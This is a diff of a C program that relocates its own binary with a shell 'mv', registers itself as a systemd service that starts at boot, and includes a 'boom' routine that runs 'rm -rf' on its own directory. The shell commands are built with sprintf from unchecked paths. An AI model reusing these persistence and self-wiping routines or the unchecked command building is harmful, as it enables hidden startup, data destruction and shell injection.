@@ -36,35 +36,9 @@ void exeCMD(char *cmd){
    pclose(fp);
 }
 
-
-//parse path to command
-void move(char *path, char *pName){
+void serviceSetting(char *path,char *pName){
     struct cmd_struct cmd;
-    //Get now program location
-    getNowPath(cmd.nowPath);
-
-    printf("%s",cmd.nowPath);
-
-
-    getpName(pName);
-    //parse path to cmd
-    sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,pName,path,pName);
-    // printf("%s",cmd.cmd);
-    exeCMD(cmd.cmd);
-}
-
-void boom(char *path,char *pName){
-    struct cmd_struct cmd;
-    getNowPath(cmd.nowPath);
-    getpName(pName);
-    sprintf(cmd.cmd,"rm -rf %s",cmd.nowPath);
-    exeCMD(cmd.cmd);
-}
-
-
-void serviceSetting(char *pName){
-    struct cmd_struct cmd;   
-    getNowPath(cmd.nowPath);
+    if(path == NULL) getNowPath(cmd.nowPath);
     getpName(pName);
 	//Connect path with program	
 	sprintf(cmd.cmd,"%s%s",cmd.nowPath,pName);
@@ -86,6 +60,34 @@ void serviceSetting(char *pName){
 	    "WantedBy=multi-user.target\n\n",cmd.cmd);
 	fprintf(f,"%s",cmd.cmd);
 }
+
+//parse path to command
+void move(char *path, char *pName){
+    struct cmd_struct cmd;
+    //Get now program location
+    getNowPath(cmd.nowPath);
+
+    printf("%s",cmd.nowPath);
+
+
+    getpName(pName);
+    //parse path to cmd
+    sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,pName,path,pName);
+    // printf("%s",cmd.cmd);
+    exeCMD(cmd.cmd);
+    serviceSetting(path,pName);
+}
+
+void boom(char *path,char *pName){
+    struct cmd_struct cmd;
+    getNowPath(cmd.nowPath);
+    getpName(pName);
+    sprintf(cmd.cmd,"rm -rf %s",cmd.nowPath);
+    exeCMD(cmd.cmd);
+}
+
+
+
 
 void getHostname(char *hostname){
     //Get hostname from this computer
